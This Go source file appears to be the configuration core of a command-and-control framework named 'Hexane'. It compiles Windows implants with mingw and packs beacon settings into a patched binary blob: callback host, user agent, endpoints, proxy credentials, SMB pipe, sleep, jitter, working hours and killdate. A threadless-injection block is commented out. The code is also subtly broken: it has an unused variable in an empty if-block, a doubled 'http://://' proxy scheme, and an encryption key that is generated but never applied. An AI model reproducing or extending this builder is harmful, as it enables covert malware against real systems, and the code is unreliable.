package core

import (
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"strconv"
	"strings"
)

var (
	Debug        = false
	ShowCommands = false

	Cb       = make(chan Callback)
	Payloads = new(HexanePayloads)
	Servers  = new(ServerList)
	Session  = &HexaneSession{
		Username: "lemur",
		Admin:    true,
	}
)

var (
	FstatCreate = os.O_WRONLY | os.O_CREATE | os.O_TRUNC
	FstatWrite  = os.O_WRONLY | os.O_APPEND
	FstatRW     = os.O_RDWR | os.O_APPEND
)

var ModuleStrings = []string{
	"crypt32",
	"winhttp",
	"advapi32",
	"iphlpapi",
}

func (h *HexaneConfig) GetTransportType() (string, error) {
	switch h.ImplantCFG.ProfileTypeId {
	case TRANSPORT_HTTP:
		return "TRANSPORT_HTTP", nil
	case TRANSPORT_PIPE:
		return "TRANSPORT_PIPE", nil
	default:
		return "", fmt.Errorf("transport type was not defined")
	}
}

func (h *HexaneConfig) GetEmbededStrings(strList []string) []byte {
	var stream = new(Stream)

	stream.PackString(string(h.Key))

	if h.ImplantCFG.ProfileTypeId == TRANSPORT_HTTP {
		stream.PackDword(1)
	} else if h.ImplantCFG.ProfileTypeId == TRANSPORT_PIPE {
		stream.PackDword(0)
	}

	stream.PackDword(1) // Ctx->LE == TRUE

	for _, str := range strList {
		stream.PackString(str)
	}

	return stream.Buffer
}

func GetModuleConfig(cfgName string) (*Object, error) {
	var (
		err    error
		buffer []byte
		module *Object
	)

	if buffer, err = os.ReadFile(cfgName); err != nil {
		return nil, err
	}

	if err = json.Unmarshal(buffer, &module); err != nil {
		return nil, err
	}

	module.ConfigName = cfgName
	module.IncludeDirectories = append(module.IncludeDirectories, RootDirectory)

	return module, nil
}

func (h *HexaneConfig) GenerateConfigBytes() error {
	key := CryptCreateKey(16)
	patch, err := h.PePatchConfig()
	if err != nil {
		return err
	}

	h.Key = key
	h.ConfigBytes = patch // Assuming XteaCrypt(patch) if needed.
	return nil
}

func (h *HexaneConfig) CreateConfig(jsonCfg Json) error {
	var err error

	h.CompilerCFG = new(CompilerConfig)
	h.ImplantCFG = new(ImplantConfig)

	h.BuildType = jsonCfg.Config.BuildType

	switch h.BuildType {
	case "bin":
		h.CompilerCFG.FileExtension = ".bin"
	case "dll":
		h.CompilerCFG.FileExtension = ".dll"
	case "exe":
		h.CompilerCFG.FileExtension = ".exe"
	default:
		return fmt.Errorf("unkown build type. Exiting")
	}

	WrapMessage("INF", fmt.Sprintf("generating config for %s", h.CompilerCFG.FileExtension))

	h.Config.ImplantName = jsonCfg.ImplantName
	h.CompilerCFG.BuildDirectory = fmt.Sprintf("../payload/%s", strings.TrimSuffix(h.ImplantName, h.CompilerCFG.FileExtension))

	h.CompilerCFG.Debug = jsonCfg.Config.Debug
	h.CompilerCFG.Arch = jsonCfg.Config.Arch
	h.CompilerCFG.Ar = "/usr/bin/x86_64-w64-mingw32-ar"
	h.CompilerCFG.Mingw = "/usr/bin/x86_64-w64-mingw32-g++"
	h.CompilerCFG.Linker = "/usr/bin/x86_64-w64-mingw32-ld"
	h.CompilerCFG.Objcopy = "/usr/bin/x86_64-w64-mingw32-objcopy"
	h.CompilerCFG.Windres = "/usr/bin/x86_64-w64-mingw32-windres"
	h.CompilerCFG.Strip = "/usr/bin/x86_64-w64-mingw32-strip"
	h.CompilerCFG.Assembler = "/usr/bin/nasm"

	h.ImplantCFG.LoadedModules = []string{
		"crypt32",
		"winhttp",
		"advapi32",
		"iphlpapi",
		".reloc",
	}

	if jsonCfg.Config.Debug {
		h.CompilerCFG.Flags = []string{
			"",
			"-std=c++23",
			"-g -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel",
			"-fno-ident -fpack-struct=8 -falign-functions=1",
			"-ffunction-sections -fdata-sections -falign-jumps=1 -w",
			"-falign-labels=1 -fPIC",
			"-Wl,--no-seh,--enable-stdcall-fixup,--gc-sections",
		}
	} else {
		h.CompilerCFG.Flags = []string{
			"",
			"-std=c++23",
			"-Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel",
			"-fno-ident -fpack-struct=8 -falign-functions=1",
			"-ffunction-sections -fdata-sections -falign-jumps=1 -w",
			"-falign-labels=1 -fPIC",
			"-Wl,--no-seh,--enable-stdcall-fixup,--gc-sections",
		}
	}

	return err
}

func (jn *JsonNetwork) ReadNetworkConfig(data []byte) error {
	var (
		err error
		tmp struct {
			ProfileType string
			Config      json.RawMessage
		}
	)

	if err = json.Unmarshal(data, &tmp); err != nil {
		return err
	}

	jn.ProfileType = tmp.ProfileType

	switch jn.ProfileType {
	case "http":

		var httpConfig HttpConfig
		if err = json.Unmarshal(tmp.Config, &httpConfig); err != nil {
			return err
		}
		jn.Config = httpConfig

	case "smb":

		var smbConfig SmbConfig
		if err = json.Unmarshal(tmp.Config, &smbConfig); err != nil {
			return err
		}
		jn.Config = smbConfig

	default:
		return fmt.Errorf("unrecognized profile type: %s", jn.ProfileType)
	}

	return nil
}

func ReadConfig(cfgName string) error {
	var (
		config Json
		buffer []byte
		err    error
	)

	hexane := new(HexaneConfig)
	WrapMessage("INF", fmt.Sprintf("loading %s", cfgName))
	if buffer, err = os.ReadFile(RootDirectory + "json/" + cfgName); err != nil {
		return err
	}

	if err = json.Unmarshal(buffer, &config); err != nil {
		return err
	}

	if err = hexane.CreateConfig(config); err != nil {
		return err
	}

	hexane.PeerId = GeneratePeerId()
	hexane.ImplantCFG.Sleeptime = uint32(config.Config.Sleeptime)
	hexane.ImplantCFG.Jitter = uint32(config.Config.Jitter)

	if hexane.ImplantCFG.Hostname = config.Config.Hostname; hexane.ImplantCFG.Hostname == "" {
		return fmt.Errorf("a hostname must be provided")
	}

	/*
		if config.Injection != nil {
			WrapMessage("DBG", "generating injection config")
			hexane.ImplantCFG.Injection = new(Injection)

			if config.Injection.Threadless != nil {
				hexane.ImplantCFG.Injection.Threadless = new(Threadless)
				hexane.ImplantCFG.Injection.ConfigPath = config.Injection.ConfigPath

				if hexane.ImplantCFG.Injection.Object, err = GetModuleConfig(hexane.ImplantCFG.Injection.ConfigPath); err != nil {
					WrapMessage("ERR", "injection config error.")
					return err
				}

			}
		}
	*/

	switch config.Network.ProfileType {
	case "http":
		if httpConfig, ok := config.Network.Config.(HttpConfig); ok {

		}
	case "smb":
	default:
		return fmt.Errorf("not a recognized profile type: %s", config.Network.ProfileType)
	}

	if config.Network.ProfileType == "http" {

		hexane.ImplantCFG.Profile = new(HttpConfig)
		hexane.ImplantCFG.ProfileTypeId = TRANSPORT_HTTP

		profile := hexane.ImplantCFG.Profile.(*HttpConfig)
		profile.Address = config.Network.Address
		profile.Port = config.Network.Port
		profile.Useragent = config.Network.Useragent

		if config.Network.Port < 1 || config.Network.Port > 65535 {
			return fmt.Errorf("port number must be between 1 - 65535")
		}

		profile.Endpoints = make([]string, 0, len(config.Network.Endpoints))
		profile.Endpoints = append(profile.Endpoints, config.Network.Endpoints...)

		hexane.ProxyCFG = new(ProxyConfig)

		if config.Network.Proxy.Enabled {
			if config.Network.Proxy.Port < 1 || config.Network.Proxy.Port > 65535 {
				return errors.New("proxy port number must be between 1 - 65535")
			}

			hexane.ImplantCFG.ProxyBool = true
			hexane.ProxyCFG.Proto = "http://"
			hexane.ProxyCFG.Address = config.Network.Proxy.Address
			hexane.ProxyCFG.Port = strconv.Itoa(config.Network.Proxy.Port)
		}
	} else if config.Network.ProfileType == "smb" {

		hexane.ImplantCFG.ProfileTypeId = TRANSPORT_PIPE
		hexane.ImplantCFG.EgressPipe = GenerateUuid(24)
	}

	if config.Build == nil {
		return fmt.Errorf("a build definition needs to be provided")
	}

	hexane.UserSession = Session
	return hexane.RunBuild()
}

func (h *HexaneConfig) PePatchConfig() ([]byte, error) {
	var (
		stream = CreateStream()
		Hours  int32
		err    error
	)

	if Hours, err = ParseWorkingHours(h.ImplantCFG.WorkingHours); err != nil {
		return nil, err
	}

	stream.PackString(h.ImplantCFG.Hostname)
	stream.PackString(h.ImplantCFG.Domain)
	stream.PackDword(h.PeerId)
	stream.PackDword(h.ImplantCFG.Sleeptime)
	stream.PackDword(h.ImplantCFG.Jitter)
	stream.PackInt32(Hours)
	stream.PackDword64(h.ImplantCFG.Killdate)

	switch h.ImplantCFG.ProfileTypeId {
	case TRANSPORT_HTTP:
		{
			var httpCfg = h.ImplantCFG.Profile.(*HttpConfig)

			stream.PackWString(httpCfg.Useragent)
			stream.PackWString(httpCfg.Address)
			stream.PackDword(uint32(httpCfg.Port))

			if len(httpCfg.Endpoints) == 0 {
				stream.PackDword(1)
				stream.PackWString("/")

			} else {
				stream.PackDword(uint32(len(httpCfg.Endpoints)))
				for _, uri := range httpCfg.Endpoints {
					stream.PackWString(uri)
				}
			}
			if h.ImplantCFG.ProxyBool {
				var proxyUrl = fmt.Sprintf("%v://%v:%v", h.ProxyCFG.Proto, h.ProxyCFG.Address, h.ProxyCFG.Port)

				stream.PackDword(1)
				stream.PackWString(proxyUrl)
				stream.PackWString(h.ProxyCFG.Username)
				stream.PackWString(h.ProxyCFG.Password)

			} else {
				stream.PackDword(0)
			}

			break
		}
	case TRANSPORT_PIPE:
		{
			stream.PackWString(h.ImplantCFG.EgressPipe)
		}
	}
	return stream.Buffer, err
}
